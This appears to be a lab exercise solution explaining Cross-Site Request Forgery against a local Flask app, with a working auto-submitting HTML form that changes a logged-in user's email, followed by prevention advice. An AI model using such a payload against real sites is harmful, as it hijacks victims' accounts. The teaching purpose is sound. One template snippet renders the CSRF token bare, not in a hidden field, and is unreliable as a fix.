# Cross-Site Request Forgery (CSRF) Exercise Solution

## Objective
The objective of this exercise is to demonstrate how Cross-Site Request Forgery (CSRF) vulnerabilities can be exploited and how to prevent them.

## Exploitation
1. Access the CSRF Demonstration page at `http://localhost:5000`.
2. Open a new tab and create an HTML file with the following content:
   ```html
   <html>
     <body>
       <form id="csrf-form" action="http://localhost:5000/update_profile" method="POST">
         <input type="hidden" name="email" value="hacked@attacker.com">
       </form>
       <script>
         document.getElementById("csrf-form").submit();
       </script>
     </body>
   </html>
   ```
3. Open this HTML file in a browser while logged into the vulnerable web app.
4. Observe that the user's email has been changed without their consent.

## Explanation
The application is vulnerable to CSRF because it does not verify the origin of requests. The attacker's page can exploit this by crafting a request that appears legitimate to the server.

## Prevention
To prevent CSRF vulnerabilities, implement the following measures:

1. CSRF Tokens:
   ```python
   from flask_wtf.csrf import CSRFProtect

   csrf = CSRFProtect(app)
   ```

2. Update the form in the template:
   ```html
   <form method="post" action="/update_profile">
     {{ csrf_token() }}
     <label for="email">Email:</label>
     <input type="email" id="email" name="email" value="{{ email }}">
     <button type="submit">Update</button>
   </form>
   ```

3. SameSite Cookies:
   Set cookies with the SameSite attribute to prevent them from being sent with cross-site requests:
   ```python
   @app.route('/set_cookie')
   def set_cookie():
       resp = make_response("Cookie set")
       resp.set_cookie('session', 'value', samesite='Strict')
       return resp
   ```

4. Double Submit Cookie Pattern:
   Use a separate cookie to store the CSRF token and verify it on the server side.

## Additional Prevention Measures
1. Implement strict CORS policies to limit cross-origin requests.
2. Use POST requests for state-changing operations instead of GET requests.
3. Implement re-authentication for sensitive actions.
4. Regularly update and patch all dependencies to protect against known vulnerabilities.

## Conclusion
This exercise demonstrates the dangers of CSRF attacks and the importance of implementing proper protection mechanisms. Always validate the origin of requests, use CSRF tokens, and implement additional security measures to protect your applications from CSRF attacks.
